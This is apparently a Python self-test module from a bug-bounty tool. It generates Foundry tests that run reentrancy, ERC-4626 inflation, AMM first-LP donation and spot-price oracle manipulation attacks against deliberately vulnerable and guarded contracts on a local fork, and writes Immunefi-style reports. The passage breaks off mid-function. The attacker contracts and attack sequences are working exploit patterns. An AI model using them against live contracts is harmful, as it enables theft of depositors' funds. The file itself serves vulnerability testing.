"""Self-test for the reentrancy chain-exploit generator.

Proves the profit-gate works IN BOTH DIRECTIONS against controlled targets deployed on a mainnet fork:
  * VULNERABLE target (deposit -> withdraw sends value BEFORE zeroing, no guard): the generator's attacker
    re-enters withdraw() in receive() and the profit assertion PASSES -> CONFIRMED (green).
  * SAFE target (identical shape + nonReentrant): the same attacker/template runs, the re-entry reverts,
    the attacker nets nothing and the profit assertion FAILS -> no_profit -> DISCARDED (negative control).

This is a HARNESS self-test, not a historical reproduction and not a claim that any real contract is
exploitable. It only proves: the template compiles, the attacker deploys, the fork executes the chain, and
the profit gate holds both ways. Every test carries `require(block.chainid == 1)` and never broadcasts.
"""
from __future__ import annotations

import re
import subprocess
import time
from pathlib import Path

from .chain_exploit import NATIVE_TOKEN, build_immunefi_report
from .forge_verify import _ensure_forge_std, forge_bin

# The attacker contract is the generator's reentrancy template shape (chain_exploit._REENTER_TAIL): a
# contract whose receive() re-enters the flagged withdraw(). Inlined here so the self-test deploys the
# target itself (the generator targets an existing address; the self-test deploys a controlled one).
_REENTER = """
contract Reenter {
    address public target; bytes public recall; uint256 public left;
    constructor(address t) { target = t; }
    function run() external {
        left = 5;
        recall = abi.encodeWithSignature("withdraw()");
        target.call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
        (bool ok, ) = target.call(recall);
        require(ok || address(this).balance > 0, "no entry");
    }
    receive() external payable { if (left > 0) { left--; target.call(recall); } }
}
"""

_HEAD = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2} from "forge-std/Test.sol";
interface IAgg { function latestRoundData() external view returns (uint80,int256,uint256,uint256,uint80); }
"""

# __MOD__ = "" (vulnerable) or "nonReentrant" (safe). Value is sent BEFORE the state write either way; the
# nonReentrant lock is what defeats the re-entry in the safe variant.
_VAULT = """
contract Vault {
    mapping(address => uint256) public balances;
    bool private _lock;
    modifier nonReentrant() { require(!_lock, "reent"); _lock = true; _; _lock = false; }
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external __MOD__ {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no bal");
        (bool ok, ) = msg.sender.call{value: bal}("");   // external call BEFORE the state write
        require(ok, "send");
        balances[msg.sender] = 0;
    }
    receive() external payable {}
}
"""

_TEST = """
contract PoC is Test {
    uint256 constant EXPECTED_CHAINID = 1;
    address constant ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
    function test_reentrancy() public {
        Vault v = new Vault();
        address victim = address(0xBEEF);
        vm.deal(victim, 10 ether);
        vm.prank(victim); v.deposit{value: 10 ether}();
        Reenter att = new Reenter(address(v));
        vm.deal(address(att), 1 ether);              // the attacker's OWN stake, nothing injected after
        uint256 bef = address(att).balance;
        att.run();
        uint256 aft = address(att).balance;
        int256 profit = int256(aft) - int256(bef);
        console2.log("CHAIN_PROFIT_WEI", profit);
        (, int256 px,,,) = IAgg(ETH_USD).latestRoundData();
        console2.log("ETH_USD_8DP", uint256(px));
        if (profit > 0) { console2.log("GAIN_USD", uint256(profit) * uint256(px) / 1e8 / 1e18); }
        assertGt(aft, bef, "no profit: attacker balance did not increase");   // the gate
    }
}
"""


def build_selftest_sol(vulnerable: bool) -> str:
    """Full Foundry self-test .sol: vulnerable (no guard) or safe (nonReentrant), same attacker/template."""
    return _HEAD + _VAULT.replace("__MOD__", "" if vulnerable else "nonReentrant") + _REENTER + _TEST


# =====================================================================================================
# ERC-4626 first-depositor / inflation self-test.
# Attack (same chain on both vaults): attacker makes a 1-wei first deposit, DONATES underlying straight to
# the vault to inflate assets-per-share, a victim deposits (rounds to ~0 shares on the vulnerable vault),
# attacker redeems its single share for the whole inflated pool - capturing the victim's deposit.
#   VULNERABLE: no MINIMUM_LIQUIDITY lock -> the 1-wei share mints, inflation works, attacker profits.
#   SAFE: MINIMUM_LIQUIDITY dead-shares lock -> the 1-wei first deposit reverts (require s > MIN), the
#         attacker never gets a share, its donation is captured by the victim, attacker LOSES -> discarded.
_ERC4626_SELFTEST = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2} from "forge-std/Test.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract Vault {
    MockERC20 public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public shares;
    bool public immutable guarded;
    uint256 constant MIN = 1000;                               // MINIMUM_LIQUIDITY
    constructor(MockERC20 a, bool g) { asset = a; guarded = g; }
    function totalAssets() public view returns (uint256) { return asset.balanceOf(address(this)); }
    function deposit(uint256 assets, address to) external returns (uint256 s) {
        uint256 ts = totalSupply;
        s = ts == 0 ? assets : assets * ts / totalAssets();
        asset.transferFrom(msg.sender, address(this), assets);
        if (ts == 0 && guarded) {                              // safe: lock dead shares on first deposit
            require(s > MIN, "min liq");
            shares[address(0xdead)] += MIN; totalSupply += MIN; s -= MIN;
        }
        shares[to] += s; totalSupply += s;
    }
    function redeem(uint256 s, address to) external returns (uint256 a) {
        a = s * totalAssets() / totalSupply;
        shares[msg.sender] -= s; totalSupply -= s;
        asset.transfer(to, a);
    }
}

contract PoC is Test {
    uint256 constant EXPECTED_CHAINID = 1;
    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
    function test_erc4626_inflation() public {
        MockERC20 tok = new MockERC20();
        Vault v = new Vault(tok, __GUARDED__);
        address attacker = address(0xA11CE);
        address victim = address(0xBEEF);
        uint256 donation = 1000 ether;
        uint256 victimDep = 500 ether;
        tok.mint(attacker, donation + 1 ether);
        tok.mint(victim, victimDep);
        uint256 attBefore = tok.balanceOf(attacker);
        vm.startPrank(attacker);
        tok.approve(address(v), type(uint256).max);
        try v.deposit(1, attacker) {} catch {}                 // 1-wei first deposit (reverts on safe vault)
        tok.transfer(address(v), donation);                    // donation inflates assets-per-share
        vm.stopPrank();
        vm.startPrank(victim);
        tok.approve(address(v), type(uint256).max);
        try v.deposit(victimDep, victim) {} catch {}
        vm.stopPrank();
        vm.startPrank(attacker);
        uint256 sh = v.shares(attacker);
        if (sh > 0) { try v.redeem(sh, attacker) {} catch {} }
        vm.stopPrank();
        uint256 attAfter = tok.balanceOf(attacker);
        console2.log("CHAIN_PROFIT_WEI", int256(attAfter) - int256(attBefore));
        assertGt(attAfter, attBefore, "no profit: inflation did not capture the victim deposit");
    }
}
"""


def build_erc4626_selftest_sol(vulnerable: bool) -> str:
    """ERC-4626 inflation self-test: vulnerable (no MIN_LIQUIDITY) or safe (dead-shares lock)."""
    return _ERC4626_SELFTEST.replace("__GUARDED__", "false" if vulnerable else "true")


# =====================================================================================================
# AMM donation / first-LP self-test (Uniswap-V2 shape). First LP mints a tiny position, DONATES tokens
# straight to the pool to inflate reserves-per-LP, a victim adds liquidity (rounds to ~0 LP on the
# vulnerable pool), the attacker removes liquidity and captures the victim's deposit.
#   VULNERABLE: no MINIMUM_LIQUIDITY burn -> the 1-wei first mint succeeds, inflation works, attacker profits.
#   SAFE: Uniswap-V2 MINIMUM_LIQUIDITY (1000 LP) burned to address(0) on the first mint -> the tiny first
#         mint reverts, the attacker never gets LP, its donation is captured by the victim -> discarded.
_AMM_SELFTEST = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2} from "forge-std/Test.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract Pair {
    MockERC20 public token;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;   // LP balances
    bool public immutable guarded;
    uint256 constant MINIMUM_LIQUIDITY = 1000;
    constructor(MockERC20 t, bool g) { token = t; guarded = g; }
    function reserve() public view returns (uint256) { return token.balanceOf(address(this)); }
    function addLiquidity(uint256 amount, address to) external returns (uint256 liq) {
        uint256 ts = totalSupply;
        liq = ts == 0 ? amount : amount * ts / reserve();   // reserve() = balance BEFORE this transferFrom
        token.transferFrom(msg.sender, address(this), amount);
        if (ts == 0 && guarded) {                           // UniV2: lock MINIMUM_LIQUIDITY to address(0)
            require(liq > MINIMUM_LIQUIDITY, "min liq");
            balanceOf[address(0)] += MINIMUM_LIQUIDITY; totalSupply += MINIMUM_LIQUIDITY; liq -= MINIMUM_LIQUIDITY;
        }
        balanceOf[to] += liq; totalSupply += liq;
    }
    function removeLiquidity(uint256 liq, address to) external returns (uint256 amt) {
        amt = liq * reserve() / totalSupply;
        balanceOf[msg.sender] -= liq; totalSupply -= liq;
        token.transfer(to, amt);
    }
}

contract PoC is Test {
    uint256 constant EXPECTED_CHAINID = 1;
    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
    function test_amm_donation() public {
        MockERC20 tok = new MockERC20();
        Pair p = new Pair(tok, __GUARDED__);
        address attacker = address(0xA11CE);
        address victim = address(0xBEEF);
        uint256 donation = 1000 ether;
        uint256 victimDep = 500 ether;
        tok.mint(attacker, donation + 1 ether);
        tok.mint(victim, victimDep);
        uint256 attBefore = tok.balanceOf(attacker);
        vm.startPrank(attacker);
        tok.approve(address(p), type(uint256).max);
        try p.addLiquidity(1, attacker) {} catch {}         // tiny first LP (reverts on the safe pool)
        tok.transfer(address(p), donation);                 // donation inflates reserves-per-LP
        vm.stopPrank();
        vm.startPrank(victim);
        tok.approve(address(p), type(uint256).max);
        try p.addLiquidity(victimDep, victim) {} catch {}
        vm.stopPrank();
        vm.startPrank(attacker);
        uint256 lp = p.balanceOf(attacker);
        if (lp > 0) { try p.removeLiquidity(lp, attacker) {} catch {} }
        vm.stopPrank();
        uint256 attAfter = tok.balanceOf(attacker);
        console2.log("CHAIN_PROFIT_WEI", int256(attAfter) - int256(attBefore));
        assertGt(attAfter, attBefore, "no profit: donation did not capture the victim LP");
    }
}
"""


def build_amm_selftest_sol(vulnerable: bool) -> str:
    """AMM donation self-test: vulnerable (no MINIMUM_LIQUIDITY) or safe (UniV2 MINIMUM_LIQUIDITY burn)."""
    return _AMM_SELFTEST.replace("__GUARDED__", "false" if vulnerable else "true")


# =====================================================================================================
# Spot-price flash-manipulation self-test. A lending contract values collateral off a UniV2 pair.
#   VULNERABLE: reads the pair's SPOT reserves -> an attacker whose flash-loan-funded swap skews the
#     reserves in the same tx borrows far beyond its collateral's true value (bad debt) -> CONFIRMED.
#   SAFE: reads a TWAP checkpointed from a prior block -> the same-tx spot skew does not move the oracle,
#     so the attacker can only borrow its collateral's true value -> no excess -> DISCARDED.
# The flash loan is abstracted as a net-zero reserve manipulation (moved to skew the price, then restored),
# which is exactly its economic effect; the oracle choice (spot vs TWAP) is what the test isolates.
_SPOT_SELFTEST = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2} from "forge-std/Test.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract Pair {
    uint256 public reserveCol;
    uint256 public reserveUsd;
    uint256 public pinnedTwap;                                     // TWAP checkpointed from a prior block
    constructor(uint256 c, uint256 u) { reserveCol = c; reserveUsd = u; pinnedTwap = u * 1e18 / c; }
    function spotPrice() public view returns (uint256) { return reserveUsd * 1e18 / reserveCol; }
    function twapPrice() public view returns (uint256) { return pinnedTwap; }
    function flashManipulate(uint256 c, uint256 u) external { reserveCol = c; reserveUsd = u; }   // flash-swap net effect
}

contract Lending {
    Pair public pair; bool public useTwap;
    MockERC20 public col; MockERC20 public usd;
    mapping(address => uint256) public colOf;
    constructor(Pair p, bool t, MockERC20 c, MockERC20 u) { pair = p; useTwap = t; col = c; usd = u; }
    function price() public view returns (uint256) { return useTwap ? pair.twapPrice() : pair.spotPrice(); }
    function deposit(uint256 a) external { col.transferFrom(msg.sender, address(this), a); colOf[msg.sender] += a; }
    function maxBorrow(address who) public view returns (uint256) { return colOf[who] * price() / 1e18; }
    function borrow(uint256 want) external { require(want <= maxBorrow(msg.sender), "undercollateralized"); usd.transfer(msg.sender, want); }
}

contract PoC is Test {
    uint256 constant EXPECTED_CHAINID = 1;
    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
    function test_spot_price_manip() public {
        MockERC20 col = new MockERC20();
        MockERC20 usd = new MockERC20();
        Pair pair = new Pair(1000 ether, 1000 ether);              // fair spot & TWAP = 1 USD/COL
        Lending lend = new Lending(pair, __USE_TWAP__, col, usd);
        usd.mint(address(lend), 1_000_000 ether);
        address attacker = address(0xA11CE);
        col.mint(attacker, 100 ether);
        uint256 colGiven = 100 ether;                             // true value 100 USD at price 1
        vm.startPrank(attacker);
        col.approve(address(lend), type(uint256).max);
        lend.deposit(100 ether);
        pair.flashManipulate(100 ether, 100_000 ether);           // flash-loan-funded swap: spot -> 1000 USD/COL
        uint256 usdBefore = usd.balanceOf(attacker);
        try lend.borrow(lend.maxBorrow(attacker)) {} catch {}
        pair.flashManipulate(1000 ether, 1000 ether);             // repay flash: reserves restored (net-zero)
        vm.stopPrank();
        uint256 usdGain = usd.balanceOf(attacker) - usdBefore;
        console2.log("CHAIN_PROFIT_WEI", int256(usdGain) - int256(colGiven));
        assertGt(usdGain, colGiven, "no profit: borrow did not exceed collateral true value");
    }
}
"""


def build_spot_selftest_sol(vulnerable: bool) -> str:
    """Spot-price flash-manip self-test: vulnerable reads SPOT (useTwap=false); safe reads TWAP (useTwap=true)."""
    return _SPOT_SELFTEST.replace("__USE_TWAP__", "false" if vulnerable else "true")


_PROFIT_RE = re.compile(r"CHAIN_PROFIT_WEI\s+(-?\d+)")
_PX_RE = re.compile(r"ETH_USD_8DP\s+(\d+)")


def _run(forge: str, proj: Path, name: str, sol: str, rpc_url: str, timeout: int = 160):
    d = proj / "test" / "gen" / "selftest"
    d.mkdir(parents=True, exist_ok=True)
    for old in d.glob("*.t.sol"):
        try: old.unlink()
        except OSError: pass
    p = d / f"{name}.t.sol"
    p.write_text(sol, encoding="utf-8")
    r = subprocess.run([forge, "test", "--mp", str(p.relative_to(proj)), "--fork-url", rpc_url, "-vv"],
                       cwd=proj, capture_output=True, text=True, timeout=timeout)
    out = r.stdout + "\n" + r.stderr
    passed = re.search(r"\[PASS\]\s+test_reentrancy", out) is not None
    pm = _PROFIT_RE.search(out)
    profit = int(pm.group(1)) if pm else 0
    pxm = _PX_RE.search(out)
    eth_usd = (int(pxm.group(1)) / 1e8) if pxm else 0.0
    return {"passed": passed, "profit_wei": profit, "eth_usd": eth_usd, "test_path": str(p), "out": out}


def run_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
    """Run BOTH directions on a fork. Returns a dict; 'green' is True only when the vulnerable target
    CONFIRMS (pass + profit>0) AND the safe target DISCARDS (profit<=0, assertion fails). Writes the report
    and README into out_dir. Raises nothing - the caller inspects the result."""
    forge = forge_bin()
    if not forge or not rpc_url:
        return {"green": False, "error": "forge or rpc unavailable"}
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return {"green": False, "error": "forge-std unavailable"}

    vuln = _run(forge, proj, "VulnVault_withdraw", build_selftest_sol(True), rpc_url)
    safe = _run(forge, proj, "SafeVault_withdraw", build_selftest_sol(False), rpc_url)

    # Template-bug guard: a confirmation must come with positive profit, never a bare pass.
    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
    green = vuln_confirmed and safe_discarded

    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
    report_path = ""
    if vuln_confirmed:
        gain_usd = vuln["profit_wei"] / 1e18 * vuln["eth_usd"]
        trace = "\n".join(l for l in vuln["out"].splitlines()
                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|ETH_USD|GAIN_USD|Suite result", l))[:1500]
        snippet = ('function withdraw() external {\n'
                   '    uint256 bal = balances[msg.sender];\n'
                   '    require(bal > 0);\n'
                   '    (bool ok, ) = msg.sender.call{value: bal}("");   // call BEFORE the state write\n'
                   '    require(ok);\n'
                   '    balances[msg.sender] = 0;                         // settled too late\n'
                   '}')
        md = build_immunefi_report("VulnVault", "(controlled target, deployed on the fork)", "withdraw",
                                   vuln["profit_wei"], gain_usd, vuln["eth_usd"], NATIVE_TOKEN,
                                   vuln["test_path"], trace, snippet)
        md = "> **Harness self-test — controlled target, not a historical reproduction.**\n\n" + md
        report_path = str(out_dir / f"self_test_reentrancy_{ts}.md")
        Path(report_path).write_text(md, encoding="utf-8")

    readme = f"""# Reentrancy chain-exploit — harness self-test

Status: {"GREEN (both directions)" if green else "NOT GREEN"}  ·  generated {ts} UTC

## What this proves
The reentrancy chain-exploit generator works **in both directions** of the profit gate, on a mainnet fork:

| Target (deployed on the fork) | Guard | Expected | Result |
|---|---|---|---|
| VulnVault.withdraw() | none (call before zeroing) | CONFIRMED (attacker profits) | {"PASS, +" + str(vuln["profit_wei"]) + " wei" if vuln_confirmed else "unexpected: " + str(vuln)} |
| SafeVault.withdraw() | nonReentrant | DISCARDED (no profit) | {"discarded (profit " + str(safe["profit_wei"]) + ")" if safe_discarded else "unexpected: " + str(safe)} |

Specifically it proves: the template **compiles**, the attacker contract **deploys**, the fork **executes**
the full attack chain, and the **profit assertion is the gate** — it confirms a real drain and discards a
guarded contract. The `require(block.chainid == 1)` fork-guard is present and nothing is broadcast.

## What this does NOT prove
- It is **not** a reproduction of any historical exploit, and makes **no claim** that any real deployed
  contract is exploitable. Both targets are controlled contracts deployed inside the test.
- A pass without positive profit is treated as a **build failure**, never a finding.

## Re-run
`forge test --match-path 'test/gen/selftest/**' --fork-url <mainnet-rpc>` (local fork only).
"""
    Path(out_dir / "SELFTEST_README.md").write_text(readme, encoding="utf-8")

    return {"green": green, "vuln": vuln, "safe": safe, "vuln_confirmed": vuln_confirmed,
            "safe_discarded": safe_discarded, "report_path": report_path,
            "readme_path": str(out_dir / "SELFTEST_README.md")}


def run_erc4626_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
    """ERC-4626 inflation self-test, both directions. VULNERABLE (no MIN_LIQUIDITY) must CONFIRM (attacker
    captures the victim deposit, profit>0); SAFE (dead-shares lock) must DISCARD (attacker loses its
    donation, profit<=0). Writes self_test_erc4626_<ts>.md + updates the README. 'green' iff both hold."""
    forge = forge_bin()
    if not forge or not rpc_url:
        return {"green": False, "error": "forge or rpc unavailable"}
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return {"green": False, "error": "forge-std unavailable"}

    def _run4626(name, sol):
        d = proj / "test" / "gen" / "selftest4626"
        d.mkdir(parents=True, exist_ok=True)
        for old in d.glob("*.t.sol"):
            try: old.unlink()
            except OSError: pass
        p = d / f"{name}.t.sol"
        p.write_text(sol, encoding="utf-8")
        r = subprocess.run([forge, "test", "--mp", str(p.relative_to(proj)), "--fork-url", rpc_url, "-vv"],
                           cwd=proj, capture_output=True, text=True, timeout=160)
        out = r.stdout + "\n" + r.stderr
        passed = re.search(r"\[PASS\]\s+test_erc4626", out) is not None
        pm = _PROFIT_RE.search(out)
        return {"passed": passed, "profit_wei": int(pm.group(1)) if pm else 0, "test_path": str(p), "out": out}

    vuln = _run4626("VulnVault4626", build_erc4626_selftest_sol(True))
    safe = _run4626("SafeVault4626", build_erc4626_selftest_sol(False))
    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
    green = vuln_confirmed and safe_discarded

    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
    report_path = ""
    if vuln_confirmed:
        trace = "\n".join(l for l in vuln["out"].splitlines()
                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|Suite result", l))[:1200]
        md = f"""> **Harness self-test — controlled target, not a historical reproduction.**

# ERC-4626 first-depositor inflation captures a victim deposit

**Chain:** ethereum (fork)  ·  **Contract:** (controlled Vault, deployed on the fork)  ·  **Verdict:** CONFIRMED

## Description
A share vault with no MINIMUM_LIQUIDITY lock lets the first depositor mint 1 wei of shares, then DONATE
assets straight to the vault to inflate assets-per-share. A later victim's deposit rounds down to ~0 shares,
and the attacker redeems its single share for the whole inflated pool — capturing the victim's deposit.
Proven on a fork: the attacker netted **{vuln['profit_wei']} wei** of the underlying (the victim's deposit).

## Vulnerability Details
`deposit()` computes `shares = assets * totalSupply / totalAssets` with no minimum-liquidity / dead-shares
lock, so a donation after a 1-wei first mint inflates the price and rounds the next depositor to zero.

## Impact Details
- **Captured on the fork:** {vuln['profit_wei']} wei of the vault's underlying ERC-20 (the victim's deposit).
- Any later depositor whose amount rounds below one share is fully absorbed.

## Proof of Concept
Foundry test (local fork, `require(block.chainid == 1)`, never broadcast): `{vuln['test_path']}`
```
{trace}
```
Negative control (same template, safe vault with a MINIMUM_LIQUIDITY dead-shares lock): profit {safe['profit_wei']} wei → **discarded**.

## Recommendation
Mint a MINIMUM_LIQUIDITY of dead shares on the first deposit (or use OpenZeppelin ERC4626 virtual-shares /
decimals offset) so share price cannot be inflated and small deposits never round to zero.
"""
        report_path = str(out_dir / f"self_test_erc4626_{ts}.md")
        Path(report_path).write_text(md, encoding="utf-8")

    readme = out_dir / "SELFTEST_README.md"
    extra = (f"\n\n## ERC-4626 inflation ({ts} UTC) — {'GREEN (both directions)' if green else 'NOT GREEN'}\n"
             f"| Target | Guard | Expected | Result |\n|---|---|---|---|\n"
             f"| Vault.deposit/redeem | none (no MIN_LIQUIDITY) | CONFIRMED | "
             f"{'PASS, +' + str(vuln['profit_wei']) + ' wei captured' if vuln_confirmed else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
             f"| Vault.deposit/redeem | MINIMUM_LIQUIDITY dead-shares | DISCARDED | "
             f"{'discarded (profit ' + str(safe['profit_wei']) + ')' if safe_discarded else 'unexpected: ' + str(safe['profit_wei'])} |\n")
    try:
        readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
    except OSError:
        pass

    return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
            "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}


def _run_pattern(forge, proj, rpc_url, subdir, name, test_re, sol, timeout=160):
    d = proj / "test" / "gen" / subdir
    d.mkdir(parents=True, exist_ok=True)
    for old in d.glob("*.t.sol"):
        try: old.unlink()
        except OSError: pass
    p = d / f"{name}.t.sol"
    p.write_text(sol, encoding="utf-8")
    r = subprocess.run([forge, "test", "--mp", str(p.relative_to(proj)), "--fork-url", rpc_url, "-vv"],
                       cwd=proj, capture_output=True, text=True, timeout=timeout)
    out = r.stdout + "\n" + r.stderr
    passed = re.search(rf"\[PASS\]\s+{test_re}", out) is not None
    pm = _PROFIT_RE.search(out)
    return {"passed": passed, "profit_wei": int(pm.group(1)) if pm else 0, "test_path": str(p), "out": out}


def run_amm_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
    """AMM donation self-test, both directions. VULNERABLE (no MINIMUM_LIQUIDITY) must CONFIRM (attacker
    captures the victim LP, profit>0); SAFE (UniV2 MINIMUM_LIQUIDITY burn) must DISCARD (attacker loses its
    donation, profit<=0). Writes self_test_amm_<ts>.md + appends to the README. 'green' iff both hold."""
    forge = forge_bin()
    if not forge or not rpc_url:
        return {"green": False, "error": "forge or rpc unavailable"}
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return {"green": False, "error": "forge-std unavailable"}

    vuln = _run_pattern(forge, proj, rpc_url, "selftestamm", "VulnPair", "test_amm_donation", build_amm_selftest_sol(True))
    safe = _run_pattern(forge, proj, rpc_url, "selftestamm", "SafePair", "test_amm_donation", build_amm_selftest_sol(False))
    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
    green = vuln_confirmed and safe_discarded

    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
    report_path = ""
    if vuln_confirmed:
        trace = "\n".join(l for l in vuln["out"].splitlines()
                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|Suite result", l))[:1200]
        md = f"""> **Harness self-test — controlled target, not a historical reproduction.**

# AMM first-LP donation captures a victim's liquidity

**Chain:** ethereum (fork)  ·  **Contract:** (controlled UniV2-style Pair, deployed on the fork)  ·  **Verdict:** CONFIRMED

## Description
A pool with no MINIMUM_LIQUIDITY burn lets the first LP mint a 1-wei position, then DONATE tokens straight
to the pair to inflate reserves-per-LP. A later liquidity provider rounds down to ~0 LP, and the attacker
removes its position for the whole inflated pool — capturing the victim's deposit. Proven on a fork: the
attacker netted **{vuln['profit_wei']} wei** (the victim's liquidity).

## Vulnerability Details
`addLiquidity()` computes `liq = amount * totalSupply / reserve` with no MINIMUM_LIQUIDITY burn, so a
donation after a 1-wei first mint inflates the ratio and rounds the next LP to zero.

## Impact Details
- **Captured on the fork:** {vuln['profit_wei']} wei of the pool's token (the victim's added liquidity).

## Proof of Concept
Foundry test (local fork, `require(block.chainid == 1)`, never broadcast): `{vuln['test_path']}`
```
{trace}
```
Negative control (same template, UniV2 MINIMUM_LIQUIDITY burn present): profit {safe['profit_wei']} wei → **discarded**.

## Recommendation
Burn MINIMUM_LIQUIDITY (e.g. 1000 LP to address(0)) on the first mint, Uniswap-V2 style, so share price can't
be inflated and small deposits never round to zero.
"""
        report_path = str(out_dir / f"self_test_amm_{ts}.md")
        Path(report_path).write_text(md, encoding="utf-8")

    readme = out_dir / "SELFTEST_README.md"
    extra = (f"\n\n## AMM donation ({ts} UTC) — {'GREEN (both directions)' if green else 'NOT GREEN'}\n"
             f"| Target | Guard | Expected | Result |\n|---|---|---|---|\n"
             f"| Pair.addLiquidity/removeLiquidity | none (no MIN_LIQUIDITY) | CONFIRMED | "
             f"{'PASS, +' + str(vuln['profit_wei']) + ' wei captured' if vuln_confirmed else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
             f"| Pair.addLiquidity/removeLiquidity | UniV2 MINIMUM_LIQUIDITY burn | DISCARDED | "
             f"{'discarded (profit ' + str(safe['profit_wei']) + ')' if safe_discarded else 'unexpected: ' + str(safe['profit_wei'])} |\n")
    try:
        readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
    except OSError:
        pass

    return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
            "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}


def run_spot_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
    """Spot-price flash-manip self-test, both directions. VULNERABLE (reads SPOT) must CONFIRM (borrow
    exceeds collateral true value); SAFE (reads TWAP) must DISCARD (borrow == true value). 'green' iff both."""
    forge = forge_bin()
    if not forge or not rpc_url:
        return {"green": False, "error": "forge or rpc unavailable"}
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return {"green": False, "error": "forge-std unavailable"}
    vuln = _run_pattern(forge, proj, rpc_url, "selftestspot", "VulnLendingSpot", "test_spot_price_manip", build_spot_selftest_sol(True))
    safe = _run_pattern(forge, proj, rpc_url, "selftestspot", "SafeLendingTwap", "test_spot_price_manip", build_spot_selftest_sol(False))
    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
    green = vuln_confirmed and safe_discarded

    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
    report_path = ""
    if vuln_confirmed:
        trace = "\n".join(l for l in vuln["out"].splitlines()
